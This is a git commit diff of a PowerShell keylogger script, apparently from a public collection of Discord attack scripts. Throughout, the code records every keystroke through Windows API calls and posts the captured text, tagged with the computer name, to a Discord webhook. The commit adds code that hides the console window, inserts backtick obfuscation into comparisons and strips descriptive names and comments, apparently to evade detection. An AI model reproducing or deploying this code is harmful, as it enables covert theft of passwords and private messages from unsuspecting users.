f0dc06415ea1afdbb06ada3c65334c5ae14cea77
egieb <93350544+beigeworm@users.noreply.github.com>
2025-06-20 21:31:22 +0000

    Update LogKeys to Discord - Activity Intelligence.ps1

--- Discord Scripts/LogKeys to Discord - Activity Intelligence.ps1
+++ Discord Scripts/LogKeys to Discord - Activity Intelligence.ps1
@@ -17,74 +17,72 @@ USAGE
 # User Setup
 $dc = "WEBHOOK_HERE"
 
-# Import DLL Definitions for keyboard inputs
-$API = @'
+$defs = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
 public static extern short GetAsyncKeyState(int virtualKeyCode); 
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int GetKeyboardState(byte[] keystate);
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int MapVirtualKey(uint uCode, int uMapType);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int MapVirtualKey(uint uCode, int uMapType);
 '@
-$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
+$defs = Add-Type -MemberDefinition $defs -Name 'Win32' -Namespace API -PassThru
 
-# Add stopwatch for intellegent sending
-$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
-$KeypressThreshold = [TimeSpan]::FromSeconds(10)
+$lastpress = [System.Diagnostics.Stopwatch]::StartNew()
+$threshold = [TimeSpan]::FromSeconds(10)
 
-# Start a continuous loop
+$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+$hwnd = (Get-Process -PID $pid).MainWindowHandle
+if($hwnd -ne [System.IntPtr]::Zero){
+    $Type::ShowWindowAsync($hwnd, 0)
+}
+else{
+    $Host.UI.RawUI.WindowTitle = 'xxx'
+    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'xxx' })
+    $hwnd = $Proc.MainWindowHandle
+    $Type::ShowWindowAsync($hwnd, 0)
+}
+
+
 While ($true){
-  $keyPressed = $false
+  $ispressed = $false
     try{
-      # Start a loop that checks the time since last activity before message is sent
-      while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
-      # Start the loop with 30 ms delay between keystate check
-      Start-Sleep -Milliseconds 30
-        for ($asc = 8; $asc -le 254; $asc++){
-        # Get the key state. (is any key currently pressed)
-        $keyst = $API::GetAsyncKeyState($asc)
-          # If a key is pressed
-          if ($keyst -eq -32767) {
-          # Restart the inactivity timer
-          $keyPressed = $true
-          $LastKeypressTime.Restart()
-          $null = [console]::CapsLock
-          # Translate the keycode to a letter
-          $vtkey = $API::MapVirtualKey($asc, 3)
-          # Get the keyboard state and create stringbuilder
-          $kbst = New-Object Byte[] 256
-          $checkkbst = $API::GetKeyboardState($kbst)
-          $logchar = New-Object -TypeName System.Text.StringBuilder
-            # Define the key that was pressed          
-            if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
-              # Check for non-character keys
-              $LString = $logchar.ToString()
-                if ($asc -eq 8) {$LString = "[BKSP]"}
-                if ($asc -eq 13) {$LString = "[ENT]"}
-                if ($asc -eq 27) {$LString = "[ESC]"}
-            # Add the key to sending variable
-            $send += $LString 
+      while ($lastpress.Elapsed` -lt $threshold) {
+      Sleep -M 30
+        for ($character = 8; $character` -le 254; $character++){
+        $keyst = $defs::GetAsyncKeyState($character)
+          if ($keyst -eq` -32767) {
+                $ispressed = $true
+                $lastpress.Restart()
+                $null = [console]::CapsLock
+                $virtual = $defs::MapVirtualKey($character, 3)
+                $state = New-Object Byte[] 256
+                $check = $defs::GetKeyboardState($state)
+                $logged = New-Object -TypeName System.Text.StringBuilder          
+            if ($defs::ToUnicode($character, $virtual, $state, $logged, $logged.Capacity, 0)) {
+                $thestring = $logged.ToString()
+                if ($character` -eq` 13) {$thestring` = "[ENT]"}
+                if ($character` -eq` 8) {$thestring` = "[BACK]"}             
+                if ($character` -eq` 27) {$thestring` = "[ESC]"}
+                $send += $thestring 
             }
           }
         }
       }
     }
     finally{
-      If ($keyPressed) {
-      # Send the saved keys to a webhook
+      If ($ispressed) {
       $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
       $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
       $escmsg = $timestamp+" : "+'`'+$escmsgsys+'`'
       $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg} | ConvertTo-Json
       Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
-      #Remove log file and reset inactivity check 
       $send = ""
-      $keyPressed = $false
+      $ispressed = $false
       }
     }
-  # reset stopwatch before restarting the loop
-  $LastKeypressTime.Restart()
-  Start-Sleep -Milliseconds 10
+  $lastpress.Restart()
+  Sleep -M 10
 }
